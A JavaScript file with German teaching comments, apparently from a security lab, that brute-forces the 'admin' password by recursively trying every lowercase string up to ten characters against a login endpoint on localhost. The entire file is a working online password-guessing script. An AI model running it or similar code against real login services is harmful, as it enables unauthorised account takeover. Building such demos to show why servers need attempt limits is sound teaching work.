// Brute-Force: probiert alle Zeichenkombinationen durch, bis eine passt.
// Funktioniert hier nur, weil der verwundbare Server beliebig viele Versuche zulässt.

const charset = "abcdefghijklmnopqrstuvwxyz"; // nur a-z, mit Zahlen/Sonderzeichen würde es zu lange dauern
const maxLength = 10; // bis zu 10 Zeichen lange Passwörter testen
const username = "admin"; // den Benutzernamen kennen wir, nur das Passwort nicht

// einen Login-Versuch schicken, gibt true zurück wenn das Passwort stimmt
// async/await, weil die Antwort vom Server kommt und wir darauf warten müssen
async function tryLogin(username, password) {
  const response = await fetch("http://localhost:3000/login", {
    method: "POST", // wir senden Daten an den Server
    headers: { "Content-Type": "application/json" }, // Daten sind JSON
    body: JSON.stringify({ username, password }), // Objekt in JSON-Text umwandeln
  });
  return response.status === 200; // 200 = Login OK, alles andere = falsch
}

// baut das Passwort Zeichen für Zeichen auf und ruft sich selbst auf (Rekursion)
// prefix = das bisher gebaute Stück, length = gewünschte Länge
async function buildAndTry(prefix, length) {
  // Passwort ist lang genug -> beim Server ausprobieren
  if (prefix.length === length) {
    const found = await tryLogin(username, prefix);
    if (found) {
      console.log("Passwort gefunden:", prefix);
      return true;
    }
    return false; // war falsch
  }

  // noch zu kurz -> jedes Zeichen anhängen und von dort aus tiefer weitermachen
  // z.B. aus "a" wird "aa", "ab", "ac" ... und für jedes davon wieder weiter
  for (const char of charset) {
    const found = await buildAndTry(prefix + char, length);
    if (found) return true; // Treffer nach oben durchreichen -> aufhören
  }
  return false; // in diesem Zweig war nichts dabei
}

async function bruteForce() {
  const start = Date.now(); // Startzeit merken, um am Ende die Dauer zu berechnen

  // zuerst alle Passwörter der Länge 1, dann 2, ... bis maxLength
  for (let length = 1; length <= maxLength; length++) {
    console.log("Probiere Länge", length, "...");
    const found = await buildAndTry("", length); // leer anfangen
    if (found) break; // gefunden -> längere Passwörter müssen wir nicht mehr testen
  }

  const seconds = (Date.now() - start) / 1000; // Millisekunden -> Sekunden
  console.log("Dauer:", seconds, "Sekunden");
}

bruteForce(); // Angriff starten
